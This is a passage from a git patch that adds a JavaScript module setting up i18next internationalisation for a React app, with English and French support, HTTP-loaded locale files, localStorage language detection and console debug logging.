++import LanguageDetector from "i18next-browser-languagedetector";
++import Backend from "i18next-http-backend";
++
++// Initialize i18n
++const initializeI18n = () => {
++	i18n
++		.use(Backend)
++		.use(LanguageDetector)
++		.use(initReactI18next)
++		.init({
++			fallbackLng: "en",
++			supportedLngs: ["en", "fr"],
++			debug: true,
++			interpolation: {
++				escapeValue: false,
++			},
++			backend: {
++				loadPath: "/locales/{{lng}}/{{ns}}.json",
++			},
++			detection: {
++				order: ["localStorage", "navigator"],
++				caches: ["localStorage"],
++			},
++			react: {
++				useSuspense: true,
++			},
++		});
++
++	// Debug logging
++	i18n.on("languageChanged", (lng) => {
++		console.log("i18n: Language changed to", lng);
++		document.documentElement.lang = lng;
++	});
++
++	i18n.on("loaded", (loaded) => {
++		console.log("i18n: Resources loaded", loaded);
++	});
++
++	i18n.on("failedLoading", (lng, ns, msg) => {
++		console.error("i18n: Failed loading language", { lng, ns, msg });
++	});
++
++	return i18n;
++};
++
++// Initialize and export i18n instance
++export default initializeI18n();
+-- 
+2.39.5 (Apple Git-154)
+
